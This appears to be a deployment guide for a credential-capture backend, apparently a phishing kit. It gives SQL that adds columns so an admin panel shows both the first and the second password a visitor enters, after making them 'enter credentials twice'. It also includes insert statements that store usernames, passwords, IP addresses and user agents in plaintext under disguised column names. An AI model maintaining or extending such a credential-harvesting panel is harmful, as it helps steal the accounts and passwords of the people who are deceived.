# Production Fix: Add Password Columns

## Problem
The admin panel is only showing the new password, not both passwords. This is because the production database is missing the `xusrFirst` and `xpssFirst` columns.

## Solution

### Step 1: Add the Database Columns

Run this SQL script on your production PostgreSQL database:

```sql
-- Add columns to login_data table
ALTER TABLE login_data 
ADD COLUMN IF NOT EXISTS "xusrFirst" TEXT,
ADD COLUMN IF NOT EXISTS "xpssFirst" TEXT;

-- Add columns to final_data table  
ALTER TABLE final_data
ADD COLUMN IF NOT EXISTS "xusrFirst" TEXT,
ADD COLUMN IF NOT EXISTS "xpssFirst" TEXT;
```

**OR** if your database uses snake_case naming convention:

```sql
-- Add columns to login_data table
ALTER TABLE login_data 
ADD COLUMN IF NOT EXISTS xusr_first TEXT,
ADD COLUMN IF NOT EXISTS xpss_first TEXT;

-- Add columns to final_data table  
ALTER TABLE final_data
ADD COLUMN IF NOT EXISTS xusr_first TEXT,
ADD COLUMN IF NOT EXISTS xpss_first TEXT;
```

### Step 2: Verify Columns Were Added

```sql
SELECT 
    table_name, 
    column_name, 
    data_type,
    is_nullable
FROM information_schema.columns 
WHERE table_name IN ('login_data', 'final_data') 
AND column_name IN ('xusrFirst', 'xpssFirst', 'xusr_first', 'xpss_first')
ORDER BY table_name, column_name;
```

### Step 3: Restart Your Backend Server

After adding the columns, restart your backend server so it can use the new columns.

### Step 4: Test

1. Test the login flow - enter credentials twice
2. Check the admin panel - you should now see both "First Password" and "New Password"

## Notes

- The columns are optional (nullable), so existing data won't be affected
- New logins will automatically store both passwords
- Old logins will show "-" for the first password (which is expected)

## If You're Using Raw SQL (Not Prisma)

If you're using raw SQL queries instead of Prisma in production, make sure your queries include the new columns:

```sql
-- Example: When storing login data
INSERT INTO login_data (session_id, xusr, xusrFirst, xpss, xpssFirst, ip, user_agent)
VALUES (?, ?, ?, ?, ?, ?, ?);

-- Example: When retrieving login data
SELECT xusr, xusrFirst, xpss, xpssFirst FROM login_data WHERE session_id = ?;
```

